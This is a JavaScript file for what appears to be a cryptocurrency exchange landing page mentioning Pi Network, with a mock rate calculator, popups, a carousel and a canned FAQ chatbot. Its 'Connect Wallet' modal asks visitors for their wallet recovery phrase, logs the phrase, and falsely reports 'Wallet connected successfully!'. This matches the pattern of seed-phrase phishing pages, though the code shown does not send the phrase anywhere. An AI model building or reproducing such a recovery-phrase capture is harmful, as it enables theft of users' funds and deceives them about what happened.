window.addEventListener('load', () => {
    const preloader = document.getElementById('preloader');
    preloader.style.display = 'none';
});

window.onload = function() {
    // Check if the popup has been shown before using localStorage
    const popupShown = localStorage.getItem('popupShown');

    if (!popupShown) {
        // Show the popup if it's the user's first time
        document.getElementById('popup-modal').style.display = 'block';

        // Mark that the popup has been shown to avoid showing it again
        localStorage.setItem('popupShown', 'true');
    }

    // Close button functionality
    document.querySelector('.close-btn').onclick = function() {
        document.getElementById('popup-modal').style.display = 'none';
    };

    // Explore button functionality
    document.getElementById('explore-btn').onclick = function() {
        document.getElementById('popup-modal').style.display = 'none';
    };
};


document.querySelector('.exchange-form').addEventListener('submit', function (e) {
    e.preventDefault();

    const cryptoAmount = parseFloat(document.getElementById('cryptoAmount').value);
    const fiatCurrency = document.getElementById('fiatCurrency').value;
    let rate;

    // Mock exchange rates
    switch (fiatCurrency) {
        case 'usdt': rate = 5; break;
        case 'btc': rate = 0.000074; break;
        case 'eth': rate = 0.0019; break;
        default: rate = 0;
    }

    const fiatValue = (cryptoAmount * rate).toLocaleString();
    document.getElementById('result').textContent = 
        `The equivalent is ${fiatValue} ${fiatCurrency.toUpperCase()}`;
});

window.addEventListener('scroll', function () {
    const navbar = document.querySelector('.navbar');
    if (window.scrollY > 50) {
        navbar.classList.add('scrolled');
    } else {
        navbar.classList.remove('scrolled');
    }
});

// particlesJS("particles-js", {
//     particles: {
//       number: { value: 80, density: { enable: true, value_area: 800 } },
//       color: { value: "#FFD700" },
//       shape: { type: "circle" },
//       opacity: { value: 0.5 },
//       size: { value: 3, random: true },
//       move: { enable: true, speed: 2 },
//     },
//     interactivity: {
//       detect_on: "canvas",
//       events: {
//         onhover: { enable: true, mode: "repulse" },
//         onclick: { enable: true, mode: "push" },
//       },
//       modes: {
//         repulse: { distance: 100 },
//         push: { particles_nb: 4 },
//       },
//     },
//   });

  document.addEventListener("DOMContentLoaded", () => {
    const backToTopButton = document.getElementById('back-to-top');

    // Show the button when scrolling down 300px
    window.addEventListener('scroll', () => {
        if (window.scrollY > 300) {
            backToTopButton.style.display = 'block';
            setTimeout(() => (backToTopButton.style.opacity = '1'), 10); // Fade in
        } else {
            backToTopButton.style.opacity = '0'; // Fade out
            setTimeout(() => (backToTopButton.style.display = 'none'), 300); // Hide
        }
    });

    // Smooth scroll to the top when the button is clicked
    backToTopButton.addEventListener('click', () => {
        window.scrollTo({
            top: 0,
            behavior: 'smooth'
        });
    });
});

const phraseModal = document.getElementById('phrase-modal');
const closeModalButton = document.getElementById('close-modal');
const submitPhraseButton = document.getElementById('submit-phrase-btn');
const phraseInput = document.getElementById('recovery-phrase');
const phraseMessage = document.getElementById('phrase-message');

// Open Modal on Wallet Button Click
document.querySelector('.btn-connect').addEventListener('click', () => {
    phraseModal.classList.add('show'); // Show the modal
});

// Close Modal Function
function closeModal() {
    phraseModal.classList.remove('show');
}

// Close Modal on Close Button Click
closeModalButton.addEventListener('click', closeModal);

// Close Modal if User Clicks Outside of Modal Content
window.addEventListener('click', (event) => {
    if (event.target === phraseModal) {
        closeModal();
    }
});

// Handle Phrase Submission
submitPhraseButton.addEventListener('click', () => {
    const recoveryPhrase = phraseInput.value.trim();

    if (recoveryPhrase.length > 0) {
        console.log(`Recovery Phrase Entered: ${recoveryPhrase}`);
        phraseMessage.classList.add('hidden'); // Hide error message if any
        closeModal(); // Close the modal

        // Proceed to wallet connection logic (customize as needed)
        alert('Wallet connected successfully!');
    } else {
        phraseMessage.innerText = 'Please enter a valid recovery phrase.';
        phraseMessage.classList.remove('hidden');
    }
});

const reviewsGrid = document.querySelector('.reviews-grid');

// Scroll reviews smoothly on swipe (for touch devices)
let isDown = false;
let startX;
let scrollLeft;

reviewsGrid.addEventListener('mousedown', (e) => {
    isDown = true;
    startX = e.pageX - reviewsGrid.offsetLeft;
    scrollLeft = reviewsGrid.scrollLeft;
});

reviewsGrid.addEventListener('mouseleave', () => {
    isDown = false;
});

reviewsGrid.addEventListener('mouseup', () => {
    isDown = false;
});

reviewsGrid.addEventListener('mousemove', (e) => {
    if (!isDown) return;
    e.preventDefault();
    const x = e.pageX - reviewsGrid.offsetLeft;
    const walk = (x - startX) * 2; // Adjust scroll speed
    reviewsGrid.scrollLeft = scrollLeft - walk;
});

// const chatFab = document.getElementById('chatFab');
// const chatModal = document.getElementById('chatModal');
// const closeChat = document.getElementById('closeChat');
// const typingIndicator = document.querySelector('.typing-indicator');


// // Open chat modal on FAB click from here
// chatFab.addEventListener('click', () => {
//     chatModal.classList.add('open');
//     typingIndicator.style.opacity = '1'; // Show typing indicator briefly
//     setTimeout(() => {
//         typingIndicator.style.opacity = '0';
//     }, 3000);
// });

// // Close chat modal on close button click
// closeChat.addEventListener('click', () => {
//     chatModal.classList.remove('open');
// });

// // Close chat modal on click outside the modal
// window.addEventListener('click', (e) => {
//     if (e.target === chatModal) {
//         chatModal.classList.remove('open');
//     }
// });

document.addEventListener("DOMContentLoaded", () => {
    const chatFab = document.getElementById("chatFab");
    const chatModal = document.getElementById("chatModal");
    const closeChat = document.getElementById("closeChat");
    const sendMessage = document.getElementById("sendMessage");
    const userInput = document.getElementById("userInput");
    const chatMessages = document.getElementById("chatMessages");
    const faqItems = document.querySelectorAll(".faq-item");

    // Open chat modal when chatFab is clicked
    chatFab.addEventListener("click", () => {
        chatModal.style.display = "block";
        scrollToBottom(); // Scroll to the bottom when opened
    });

    // Close chat modal
    closeChat.addEventListener("click", () => {
        chatModal.style.display = "none";
    });

    // Send message on click of send button
    sendMessage.addEventListener("click", () => {
        const message = userInput.value.trim();
        if (message) {
            addMessage(message, "user-message");
            userInput.value = ""; // Clear input field
            setTimeout(() => addMessage("Thanks for reaching out! How can we assist further?", "bot-message"), 1000);
        }
    });

    // Add message to chat
    function addMessage(text, className) {
        const message = document.createElement("div");
        message.className = `message ${className}`;
        message.textContent = text;
        chatMessages.appendChild(message);
        scrollToBottom(); // Auto-scroll to the bottom
    }

    // Handle FAQ click events
    faqItems.forEach(item => {
        item.addEventListener("click", () => {
            const question = item.innerText;
            const answer = item.getAttribute("data-answer");
            addMessage(question, "user-message"); // Show question as user message
            setTimeout(() => addMessage(answer, "bot-message"), 500); // Show answer as bot reply
        });
    });

    // Scroll to the bottom of the chat
    function scrollToBottom() {
        chatMessages.scrollTop = chatMessages.scrollHeight;
    }
});



// const facts = [
//     "Bitcoin was the first decentralized cryptocurrency.",
//     "Ethereum introduced smart contracts to the world.",
//     "There are over 20,000 cryptocurrencies in existence.",
//     "Elon Musk's tweets have moved crypto markets! 🚀",
//     "Crypto wallets keep your private keys safe and secure!",
//     "You can trade Pi Network Coin 24/7 with no downtime."
// ];

// function showFunFact() {
//     const randomFact = facts[Math.floor(Math.random() * facts.length)];
//     alert(`💡 Crypto Fact: ${randomFact}`);
// }

// // Show the fun fact 5 seconds after the page loads
// setTimeout(showFunFact, 5000);
